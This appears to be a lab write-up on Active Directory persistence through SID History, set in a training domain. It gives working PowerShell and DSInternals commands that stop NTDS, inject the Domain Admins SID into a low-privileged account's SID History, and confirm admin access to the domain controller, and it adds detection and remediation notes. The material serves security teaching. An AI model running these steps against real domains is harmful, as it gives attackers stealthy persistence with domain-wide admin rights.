# Persistence Through SID History

## Recap: What Are SIDs?

Security Identifiers (SIDs) are used to track security principals and manage account access to resources. An interesting attribute on accounts is **SID History**.

## Legitimate Use of SID History

SID History allows an account's access to be cloned to another account. This is useful during Active Directory (AD) migrations, enabling users to retain access to resources in the original domain while being migrated. In the new domain, the user gets a new SID, but their old SID is added to the SID History, allowing continued access to previous resources.

## Abusing SID History for Persistence

Attackers can abuse SID History for persistence:

- **SID History can include any SID**, not just those from other domains.
- **Domain Admin privileges** (or equivalent) are usually required to perform this attack.
- When an account logs on, all SIDs (including those in SID History) are added to the user's token, granting associated privileges.
- Injecting the **Enterprise Admin SID** can elevate privileges across all domains in the forest.
- Privileges are granted even if the account is not a member of the actual group, making this a stealthy persistence method.
- Attackers can use one account to alter the SID History of another, making detection and remediation harder.

---

## Forging SID History

### 1. Check Existing SID History

```powershell
Get-ADUser <your ad username> -Properties sidhistory,memberof
```

Example output (no SID History set):

```
DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled           : True
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
SID               : S-1-5-21-3885271727-2693558621-2658995185-1429
SIDHistory        : {}
```

### 2. Get the SID of the Domain Admins Group

```powershell
Get-ADGroup "Domain Admins"
```

Example output:

```
Name : Domain Admins
SID  : S-1-5-21-3885271727-2693558621-2658995185-512
```

### 3. Add SID History Using DSInternals

> **Note:** Mimikatz no longer reliably patches LSASS for SID History. Use DSInternals to patch the `ntds.dit` AD database directly.

```powershell
Stop-Service -Name ntds -Force
Add-ADDBSidHistory -SamAccountName '<low-privileged username>' -SidHistory '<SID to add>' -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service -Name ntds
```

- The NTDS database is locked while the NTDS service is running.
- Restart the NTDS service after patching, or authentication will fail network-wide.

---

## Verifying Persistence

SSH into a workstation with the low-privileged credentials and check SID History:

```powershell
Get-ADUser aaron.jones -Properties sidhistory
```

Example output:

```
SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512}
```

Test access:

```powershell
dir \\thmdc.za.tryhackme.loc\c$
```

If successful, the low-privileged account now has Domain Admin access.

---

## Detection and Remediation

- The SID History attribute is visible in AD Users and Groups snap-in but **cannot be removed** via the GUI, even with highest privileges.
- Use AD-RSAT PowerShell cmdlets to remove malicious SID History.
- Detection is difficult: regular tools do not flag users with elevated SIDs in SID History.
- SID History is only applied at authentication, making it stealthy.

**Incident Response Example:**  
After a domain takeback (rotating `krbtgt`, removing tickets, rebuilding CA), attackers may still have DA access via SID History on a low-privileged account. This is a challenging scenario for defenders.
